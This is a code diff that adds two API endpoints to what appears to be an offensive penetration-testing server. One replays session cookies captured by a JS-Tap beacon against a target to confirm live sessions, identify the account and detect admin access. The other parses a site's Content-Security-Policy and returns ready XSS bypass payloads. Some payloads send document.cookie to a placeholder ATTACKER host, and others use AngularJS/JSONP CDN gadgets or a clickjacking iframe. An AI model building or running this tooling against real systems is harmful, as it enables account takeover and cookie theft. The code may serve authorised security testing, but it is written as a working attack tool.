@@ -20259,6 +20259,379 @@ def loot_analyze_route():
         return jsonify({"error": f"Server error: {e}"}), 500
 
 
+# ─────────────────────────────────────────────────────────
+#  SESSION HIJACK VALIDATOR
+# ─────────────────────────────────────────────────────────
+class SessionHijacker:
+    """
+    Replay cookies captured by JS-Tap against a target to verify if the
+    session is still live, discover the account identity, and detect
+    admin / elevated-privilege access.
+    """
+
+    PROBE_ENDPOINTS = [
+        ("/api/me",              "GET"),
+        ("/api/user",            "GET"),
+        ("/api/profile",         "GET"),
+        ("/api/account",         "GET"),
+        ("/api/v1/me",           "GET"),
+        ("/api/v1/user",         "GET"),
+        ("/api/v2/me",           "GET"),
+        ("/api/v2/user",         "GET"),
+        ("/api/v2/profile",      "GET"),
+        ("/me",                  "GET"),
+        ("/user",                "GET"),
+        ("/profile",             "GET"),
+        ("/account",             "GET"),
+        ("/dashboard",           "GET"),
+        ("/settings",            "GET"),
+        ("/admin",               "GET"),
+        ("/admin/dashboard",     "GET"),
+        ("/api/admin",           "GET"),
+        ("/api/admin/users",     "GET"),
+        ("/api/users",           "GET"),
+        ("/wp-admin/",           "GET"),
+        ("/wp-json/wp/v2/users", "GET"),
+    ]
+
+    _ADMIN_RE = re.compile(
+        r'"?(?:is_admin|isAdmin|is_staff|isStaff|role)"?\s*[=:]\s*(?:"admin"|"superuser"|"staff"|true)',
+        re.IGNORECASE,
+    )
+    _USER_RE = re.compile(
+        r'"(?:username|email|login|name|user_login)"\s*:\s*"([^"]{2,80})"',
+        re.IGNORECASE,
+    )
+
+    def _build_session(self, cookies: List[Dict]) -> requests.Session:
+        sess = requests.Session()
+        sess.verify = False
+        sess.headers.update({"User-Agent": "Mozilla/5.0 (compatible; HexStrike/1.0)"})
+        for c in cookies:
+            sess.cookies.set(
+                str(c.get("name", "")),
+                str(c.get("value", "")),
+                domain=str(c.get("domain", "")),
+            )
+        return sess
+
+    def _probe(self, sess: requests.Session, base: str, path: str, method: str) -> Dict:
+        url = base.rstrip("/") + path
+        try:
+            r = sess.request(method, url, timeout=8, allow_redirects=True)
+            body = r.text[:600]
+            login_redirect = r.history and any(
+                "login" in (step.headers.get("location") or "").lower() or
+                "signin" in (step.headers.get("location") or "").lower()
+                for step in r.history
+            )
+            authenticated = (
+                not login_redirect
+                and r.status_code not in (401, 403)
+                and r.status_code < 400
+            )
+            um = self._USER_RE.search(body)
+            return {
+                "url":              url,
+                "status":           r.status_code,
+                "authenticated":    authenticated,
+                "is_admin":         bool(self._ADMIN_RE.search(body)),
+                "username":         um.group(1) if um else None,
+                "content_type":     r.headers.get("content-type", "")[:80],
+                "response_snippet": body[:300],
+            }
+        except Exception as exc:
+            return {"url": url, "error": str(exc), "authenticated": False, "is_admin": False, "username": None}
+
+    def _fetch_cookies_from_jstap(self, beacon_url: str, client_id: str, username: str, password: str) -> List[Dict]:
+        sess = requests.Session()
+        sess.verify = False
+        if username and password:
+            try:
+                sess.post(f"{beacon_url}/login", data={"username": username, "password": password}, timeout=10)
+            except Exception:
+                pass
+        try:
+            r = sess.get(f"{beacon_url}/api/clientCookies/{client_id}", timeout=10)
+            return r.json() if r.ok else []
+        except Exception:
+            return []
+
+    def validate(
+        self,
+        target: str,
+        cookies: List[Dict] = None,
+        client_id: str = "",
+        beacon_url: str = "http://localhost:8444",
+        jstap_username: str = "",
+        jstap_password: str = "",
+        custom_endpoints: List[str] = None,
+        extra_headers: Dict = None,
+    ) -> Dict:
+        _start = time.time()
+        if not cookies and client_id:
+            cookies = self._fetch_cookies_from_jstap(beacon_url, client_id, jstap_username, jstap_password)
+        cookies = cookies or []
+
+        sess = self._build_session(cookies)
+        if extra_headers:
+            sess.headers.update(extra_headers)
+
+        endpoints = list(self.PROBE_ENDPOINTS)
+        if custom_endpoints:
+            endpoints += [(ep.strip(), "GET") for ep in custom_endpoints if ep.strip()]
+
+        results: List[Dict] = []
+        auth_endpoints: List[str] = []
+        admin_endpoints: List[str] = []
+        discovered_username: Optional[str] = None
+
+        for path, method in endpoints:
+            res = self._probe(sess, target, path, method)
+            results.append(res)
+            if res.get("authenticated"):
+                auth_endpoints.append(res["url"])
+            if res.get("is_admin"):
+                admin_endpoints.append(res["url"])
+            if res.get("username") and not discovered_username:
+                discovered_username = res["username"]
+
+        return {
+            "target":                  target,
+            "session_valid":           len(auth_endpoints) > 0,
+            "has_admin_access":        len(admin_endpoints) > 0,
+            "discovered_username":     discovered_username,
+            "cookies_replayed":        len(cookies),
+            "endpoints_probed":        len(results),
+            "authenticated_endpoints": auth_endpoints,
+            "admin_endpoints":         admin_endpoints,
+            "results":                 results,
+            "duration_sec":            round(time.time() - _start, 2),
+        }
+
+
+session_hijacker = SessionHijacker()
+
+
+@app.route("/api/tools/session/hijack", methods=["POST"])
+def session_hijack_route():
+    try:
+        params = request.json or {}
+        result = session_hijacker.validate(
+            target=params.get("target", ""),
+            cookies=params.get("cookies"),
+            client_id=params.get("client_id", ""),
+            beacon_url=params.get("beacon_url", "http://localhost:8444"),
+            jstap_username=params.get("jstap_username", ""),
+            jstap_password=params.get("jstap_password", ""),
+            custom_endpoints=params.get("custom_endpoints"),
+            extra_headers=params.get("extra_headers"),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 session/hijack error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ─────────────────────────────────────────────────────────
+#  CSP BYPASS ANALYZER
+# ─────────────────────────────────────────────────────────
+class CSPAnalyzer:
+    """
+    Fetch a target's Content-Security-Policy header, parse every directive,
+    identify exploitable weaknesses, and return specific bypass payloads.
+    Run this before dalfox_xss_chain to know what injection is viable.
+    """
+
+    _CDN_BYPASSES: Dict[str, str] = {
+        "ajax.googleapis.com":      "<script src='//ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js'></script> → AngularJS CSTI sandbox bypass",
+        "code.angularjs.org":       "<script src='//code.angularjs.org/1.1.3/angular.min.js'></script> → AngularJS sandbox bypass",
+        "cdn.jsdelivr.net":         "<script src='//cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js'></script> → AngularJS CSTI",
+        "cdnjs.cloudflare.com":     "<script src='//cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.min.js'></script>",
+        "www.google.com":           "<script src='//www.google.com/complete/search?client=chrome&jsonp=alert(1)'></script> → JSONP",
+        "accounts.google.com":      "//accounts.google.com/o/oauth2/auth?...&callback=alert → JSONP endpoint",
+        "maps.googleapis.com":      "<script src='//maps.googleapis.com/maps/api/js?callback=alert'></script> → JSONP",
+        "www.googletagmanager.com": "<script src='//www.googletagmanager.com/gtag/js'></script> → arbitrary script load",
+        "www.youtube.com":          "<script src='//www.youtube.com/iframe_api'></script> → JSONP-like callback",
+    }
+
+    def _fetch_csp(self, url: str) -> tuple:
+        try:
+            r = requests.get(url, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
+            for hdr in ("Content-Security-Policy", "X-Content-Security-Policy", "X-WebKit-CSP"):
+                csp = r.headers.get(hdr)
+                if csp:
+                    return csp, r.status_code
+            return None, r.status_code
+        except Exception:
+            return None, 0
+
+    def _parse_csp(self, raw: str) -> Dict[str, List[str]]:
+        directives: Dict[str, List[str]] = {}
+        for part in raw.split(";"):
+            part = part.strip()
+            if not part:
+                continue
+            tokens = part.split()
+            directives[tokens[0].lower()] = tokens[1:] if len(tokens) > 1 else []
+        return directives
+
+    def _analyze(self, directives: Dict[str, List[str]]) -> List[Dict]:
+        findings: List[Dict] = []
+        script_src = directives.get("script-src") or directives.get("default-src") or []
+
+        if "'unsafe-inline'" in script_src:
+            findings.append({
+                "weakness": "unsafe-inline", "severity": "CRITICAL", "directive": "script-src",
+                "description": "Inline scripts are permitted. Direct <script> injection works.",
+                "bypass_payloads": [
+                    "<script>document.location='https://ATTACKER/?c='+document.cookie</script>",
+                    "<img src=x onerror=fetch('https://ATTACKER/?c='+btoa(document.cookie))>",
+                    "<svg onload=eval(atob('PAYLOAD_B64'))>",
+                ],
+            })
+
+        if "'unsafe-eval'" in script_src:
+            findings.append({
+                "weakness": "unsafe-eval", "severity": "HIGH", "directive": "script-src",
+                "description": "eval(), setTimeout(string), new Function() are permitted.",
+                "bypass_payloads": [
+                    "eval(atob('PAYLOAD_B64'))",
+                    "setTimeout('fetch(\"https://ATTACKER/?c=\"+document.cookie)',0)",
+                    "new Function(atob('PAYLOAD_B64'))()",
+                ],
+            })
+
+        if "*" in script_src:
+            findings.append({
+                "weakness": "wildcard_script_src", "severity": "CRITICAL", "directive": "script-src",
+                "description": "Wildcard (*) allows scripts from any origin.",
+                "bypass_payloads": ["<script src='https://ATTACKER/payload.js'></script>"],
+            })
+
+        if "data:" in script_src:
+            findings.append({
+                "weakness": "data_uri_scripts", "severity": "CRITICAL", "directive": "script-src",
+                "description": "data: URIs permitted in script-src — inline base64 payload execution.",
+                "bypass_payloads": [
+                    "<script src='data:text/javascript,alert(document.cookie)'></script>",
+                    "<script src='data:text/javascript;base64,PAYLOAD_B64'></script>",
+                ],
+            })
+
+        for src in script_src:
+            src_host = src.strip("'\"").lstrip("https:").lstrip("http:").lstrip("//").split("/")[0]
+            for cdn, bypass_note in self._CDN_BYPASSES.items():
+                if cdn == src_host or cdn in src_host:
+                    findings.append({
+                        "weakness": f"trusted_cdn_bypass:{cdn}", "severity": "HIGH", "directive": "script-src",
+                        "description": f"Allowed CDN has a known bypass vector: {cdn}",
+                        "bypass_payloads": [bypass_note],
+                    })
+
+        if "script-src" not in directives and "default-src" not in directives:
+            findings.append({
+                "weakness": "no_effective_script_src", "severity": "CRITICAL", "directive": "none",
+                "description": "No script-src or default-src — all scripts permitted by default.",
+                "bypass_payloads": ["<script>alert(document.cookie)</script>"],
+            })
+
+        if "'strict-dynamic'" in script_src:
+            has_nonce = any(s.startswith("'nonce-") for s in script_src)
+            has_hash  = any(s.startswith(("'sha256-", "'sha384-", "'sha512-")) for s in script_src)
+            if not has_nonce and not has_hash:
+                findings.append({
+                    "weakness": "strict_dynamic_no_nonce", "severity": "MEDIUM", "directive": "script-src",
+                    "description": "'strict-dynamic' without nonce/hash — trusted-script propagation may be abused.",
+                    "bypass_payloads": [],
+                })
+
+        nonces = [s for s in script_src if s.startswith("'nonce-")]
+        if nonces:
+            findings.append({
+                "weakness": "nonce_detected", "severity": "INFO", "directive": "script-src",
+                "description": f"Nonce(s) found: {nonces}. Verify they are regenerated per-request.",
+                "bypass_payloads": [f"<script nonce='{n[7:-1]}'>alert(1)</script>" for n in nonces],
+            })
+
+        if "frame-ancestors" not in directives:
+            findings.append({
+                "weakness": "no_frame_ancestors", "severity": "MEDIUM", "directive": "frame-ancestors",
+                "description": "No frame-ancestors directive — target may be frameable (clickjacking).",
+                "bypass_payloads": ["<iframe src='TARGET_URL' style='opacity:0;position:fixed;top:0;left:0;width:100%;height:100%'>"],
+            })
+
+        object_src = directives.get("object-src") or directives.get("default-src") or []
+        if not object_src or "*" in object_src:
+            findings.append({
+                "weakness": "object_src_unrestricted", "severity": "HIGH", "directive": "object-src",
+                "description": "object-src not restricted. Plugin-based bypass vectors available.",
+                "bypass_payloads": [
+                    "<object data='javascript:alert(1)'>",
+                    "<embed src='data:text/html,<script>alert(1)</script>'>",
+                ],
+            })
+
+        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "INFO": 3}
+        findings.sort(key=lambda x: sev_order.get(x["severity"], 9))
+        return findings
+
+    def analyze(self, url: str, raw_csp: str = "") -> Dict:
+        _start = time.time()
+        status_code = 200
+
+        if not raw_csp:
+            raw_csp, status_code = self._fetch_csp(url)
+
+        if not raw_csp:
+            return {
+                "url": url, "csp_present": False, "status_code": status_code,
+                "injectable": True, "total_findings": 1, "critical": 1, "high": 0,
+                "findings": [{
+                    "weakness": "no_csp", "severity": "CRITICAL", "directive": "none",
+                    "description": "No CSP header found. All inline and external scripts are allowed.",
+                    "bypass_payloads": ["<script>alert(document.cookie)</script>"],
+                }],
+                "duration_sec": round(time.time() - _start, 2),
+            }
+
+        directives = self._parse_csp(raw_csp)
+        findings   = self._analyze(directives)
+        critical   = sum(1 for f in findings if f["severity"] == "CRITICAL")
+        high       = sum(1 for f in findings if f["severity"] == "HIGH")
+
+        return {
+            "url":            url,
+            "csp_present":    True,
+            "csp_header":     raw_csp,
+            "directives":     directives,
+            "status_code":    status_code,
+            "injectable":     critical > 0,
+            "total_findings": len(findings),
+            "critical":       critical,
+            "high":           high,
+            "findings":       findings,
+            "duration_sec":   round(time.time() - _start, 2),
+        }
+
+
+csp_analyzer = CSPAnalyzer()
+
+
+@app.route("/api/tools/csp/analyze", methods=["POST"])
+def csp_analyze_route():
+    try:
+        params = request.json or {}
+        result = csp_analyzer.analyze(
+            url=params.get("url", ""),
+            raw_csp=params.get("raw_csp", ""),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 csp/analyze error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
 # Create the banner after all classes are defined
 BANNER = ModernVisualEngine.create_banner()
 
